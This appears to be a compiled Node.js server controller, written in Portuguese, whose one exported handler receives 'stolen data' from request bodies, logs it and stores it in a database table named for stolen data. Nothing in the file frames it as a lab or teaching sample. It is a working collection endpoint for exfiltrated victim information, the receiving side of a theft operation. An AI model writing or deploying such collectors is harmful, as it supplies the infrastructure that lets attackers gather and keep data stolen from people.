"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.recepcionarDadosRoubados = void 0;
const database_1 = __importDefault(require("../database"));
const recepcionarDadosRoubados = async (req, res) => {
    const { dados } = req.body;
    const query = `INSERT INTO dados_roubados (dados) VALUES ($1)`;
    console.log(`Recebendo dados roubados: ${dados}`);
    try {
        await database_1.default.query(query, [dados]);
        res.status(201).json({ message: "Dados recebidos com sucesso" });
    }
    catch (err) {
        res.status(500).json({ error: err.message });
    }
};
exports.recepcionarDadosRoubados = recepcionarDadosRoubados;
